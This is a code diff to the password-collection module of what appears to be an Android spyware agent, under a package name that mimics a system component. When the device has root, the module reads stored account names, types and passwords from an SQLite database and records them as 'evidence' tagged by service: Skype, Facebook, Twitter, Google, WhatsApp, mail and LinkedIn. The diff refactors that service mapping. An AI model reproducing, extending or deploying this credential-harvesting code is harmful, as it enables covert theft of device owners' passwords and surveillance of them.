@@ -3,6 +3,7 @@ package com.android.networking.module;
 import java.io.File;
 import java.io.IOException;
 import java.util.HashMap;
+import java.util.Iterator;
 
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
@@ -28,10 +29,19 @@ public class ModulePassword extends BaseModule {
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
 	private Markup markupPassword;
 	private HashMap<String, String> lastPasswords;
+	private HashMap<String, Integer> services = new HashMap<String,Integer>();;
 
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
+			services.put("skype", 0x02);
+			services.put("facebook", 0x03);
+			services.put("twitter", 0x04);
+			services.put("google", 0x05);
+			services.put("whatsapp", 0x07);
+			services.put("mail", 0x09);
+			services.put("linkedin", 0x0a);
+			
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
@@ -39,6 +49,7 @@ public class ModulePassword extends BaseModule {
 			}
 			return false;
 		}
+		
 	}
 
 	@Override
@@ -98,7 +109,7 @@ public class ModulePassword extends BaseModule {
 			String name = cursor.getString(1);
 			String type = cursor.getString(2);
 			String password = cursor.getString(3);
-			String service = "service";
+			String service = getService(type);
 
 			String value = name +"_"+ type +"_"+ password;
 
@@ -134,15 +145,36 @@ public class ModulePassword extends BaseModule {
 
 	}
 
+	private String getService(String type) {
+
+		Iterator<String> iter = services.keySet().iterator();
+		while(iter.hasNext()){
+			String key = iter.next();
+			if(type.contains(key)){
+				return key;
+			}
+		}
+		return "service";
+		
+	}
+	
+	private int getServiceId(String type) {
+
+		Iterator<String> iter = services.keySet().iterator();
+		while(iter.hasNext()){
+			String key = iter.next();
+			if(type.contains(key)){
+				return services.get(key);
+			}
+		}
+		
+		return 0;
+		
+	}
+
 	private void createEvidenceLocal(String type, String name) {
-		int evId=0;
-		if(type.contains("mail")) evId=0x09;
-		if(type.contains("skype")) evId=0x02;
-		if(type.contains("facebook")) evId=0x03;
-		if(type.contains("twitter")) evId=0x04;
-		if(type.contains("google")) evId=0x05;
-		if(type.contains("whatsapp")) evId=0x07;
-		if(type.contains("linkedin")) evId=0x0a;
+		int evId=getServiceId(type);
+		
 	
 		if(evId!=0)
 			ModuleAddressBook.createEvidenceLocal(evId, name);
